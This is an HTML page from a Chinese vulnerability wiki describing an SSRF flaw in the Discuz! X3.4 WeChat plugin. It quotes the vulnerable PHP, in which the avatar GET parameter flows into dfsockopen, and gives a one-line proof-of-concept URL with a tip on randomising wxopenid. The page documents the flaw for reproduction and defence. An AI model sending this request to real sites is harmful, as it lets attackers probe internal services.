@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X3.4%20Weixin%20Plugin%20ssrf/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X3.4 Weixin Plugin ssrf - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X3.4 Weixin Plugin ssrf", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 imgcropper ssrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="btn btn-xs btn-link">
+        Discuz! X3.4 Memcached未授权访问导致的rce
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x34-weixin-plugin-ssrf">Discuz! X3.4 Weixin Plugin ssrf<a class="headerlink" href="#discuz-x34-weixin-plugin-ssrf" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Discuz! X3.4</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><code>source/plugin/wechat/wechat.class.php</code> <code>WeChat</code>类<code>syncAvatar</code>方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">syncAvatar</span><span class="p">(</span><span class="o">$</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">avatar</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!$</span><span class="n">uid</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!$</span><span class="n">avatar</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dfsockopen</span><span class="p">(</span><span class="o">$</span><span class="n">avatar</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="o">$</span><span class="n">tmpFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DISCUZ_ROOT</span><span class="o">.</span><span class="s1">&#39;./data/avatar/&#39;</span><span class="o">.</span><span class="n">TIMESTAMP</span><span class="o">.</span><span class="n">random</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+<span class="w">        </span><span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">tmpFile</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">content</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">is_file</span><span class="p">(</span><span class="o">$</span><span class="n">tmpFile</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="o">$</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uploadUcAvatar</span><span class="p">::</span><span class="n">upload</span><span class="p">(</span><span class="o">$</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">tmpFile</span><span class="p">);</span>
+<span class="w">        </span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">tmpFile</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">C</span><span class="p">::</span><span class="n">t</span><span class="p">(</span><span class="s1">&#39;common_member&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">update</span><span class="p">(</span><span class="o">$</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;avatarstatus&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;1&#39;</span><span class="p">));</span>
+
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">result</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p><code>source/plugin/wechat/wechat.inc.php</code>
+中调用了<code>WeChat::syncAvatar</code>，直接用<code>$_GET['avatar']</code>作为参数传进去：</p>
+<div class="codehilite"><pre><span></span><code><span class="p">......</span>
+
+<span class="n">elseif</span><span class="p">((</span><span class="n">$ac</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">&#39;</span><span class="n">register</span><span class="p">&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">submitcheck</span><span class="p">(&#39;</span><span class="n">submit</span><span class="p">&#39;)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">$ac</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">&#39;</span><span class="n">wxregister</span><span class="p">&#39;)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$_G</span><span class="p">[&#39;</span><span class="n">wechat</span><span class="p">&#39;][&#39;</span><span class="n">setting</span><span class="p">&#39;][&#39;</span><span class="n">wechat_allowregister</span><span class="p">&#39;])</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">        </span><span class="p">......</span>
+
+<span class="w">        </span><span class="n">$uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WeChat</span><span class="o">::</span><span class="n">register</span><span class="p">(</span><span class="n">$_GET</span><span class="p">[&#39;</span><span class="n">username</span><span class="p">&#39;],</span><span class="w"> </span><span class="n">$ac</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">&#39;</span><span class="n">wxregister</span><span class="p">&#39;);</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">$uid</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$_GET</span><span class="p">[&#39;</span><span class="n">avatar</span><span class="p">&#39;])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">WeChat</span><span class="o">::</span><span class="n">syncAvatar</span><span class="p">(</span><span class="n">$uid</span><span class="p">,</span><span class="w"> </span><span class="n">$_GET</span><span class="p">[&#39;</span><span class="n">avatar</span><span class="p">&#39;]);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div>
+
+<p>不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：</p>
+<p><img alt="" src="../resource/Discuz%21X3.4WeixinPluginssrf/media/rId24.png" /></p>
+<p>这里 SSRF 的构造很简单，直接在<code>avatar</code>参数构造 url
+即可（只是注意<code>wxopenid</code>参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）：</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nl">http:</span><span class="c1">//target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http://localhost:9090/dz-weixin-plugin-ssrf&amp;wxopenid=dont_be_evil</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Discuz%21X3.4WeixinPluginssrf/media/rId26.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20imgcropper%20ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 imgcropper ssrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="btn btn-xs btn-link">
+        Discuz! X3.4 Memcached未授权访问导致的rce
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
